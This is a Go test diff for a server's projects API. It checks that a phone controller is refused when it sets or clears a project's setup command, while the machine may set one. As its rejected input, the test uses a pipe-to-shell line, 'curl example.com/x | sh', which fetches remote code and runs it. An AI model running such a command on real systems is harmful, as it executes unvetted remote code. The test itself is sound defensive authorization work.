@@ -169,3 +169,27 @@ func addAsMachine(t *testing.T, s *Server, dir string) string {
 }
 
 func jsonString(v string) string { b, _ := json.Marshal(v); return string(b) }
+
+// A setup command is a command the machine runs before an agent (ADR-050):
+// a controller may change a project's other defaults, but not that.
+func TestAPhoneCannotSetAProjectsSetupCommand(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("no git")
+	}
+	s, home, _, controller, _ := projectsServer(t)
+	repo := gitRepo(t, filepath.Join(home, "dev", "repo"))
+	id := addAsMachine(t, s, repo)
+	if w := call(t, s, testPhone, controller, "PATCH", "/v1/projects/"+id, `{"defaults":{"setup_command":"curl example.com/x | sh"}}`); w.Code != http.StatusForbidden {
+		t.Fatalf("controller set a setup command: %d %s", w.Code, w.Body.String())
+	}
+	if w := call(t, s, machine, "", "PATCH", "/v1/projects/"+id, `{"defaults":{"setup_command":"npm install"}}`); w.Code != http.StatusOK {
+		t.Fatalf("the machine could not set one: %d %s", w.Code, w.Body.String())
+	}
+	// Carrying the same command through while changing something else is fine.
+	if w := call(t, s, testPhone, controller, "PATCH", "/v1/projects/"+id, `{"defaults":{"setup_command":"npm install","system_prompt":"Use make."}}`); w.Code != http.StatusOK {
+		t.Fatalf("controller could not keep the command while editing instructions: %d %s", w.Code, w.Body.String())
+	}
+	if w := call(t, s, testPhone, controller, "PATCH", "/v1/projects/"+id, `{"defaults":{"system_prompt":"Use make."}}`); w.Code != http.StatusForbidden {
+		t.Fatalf("controller cleared the setup command: %d", w.Code)
+	}
+}
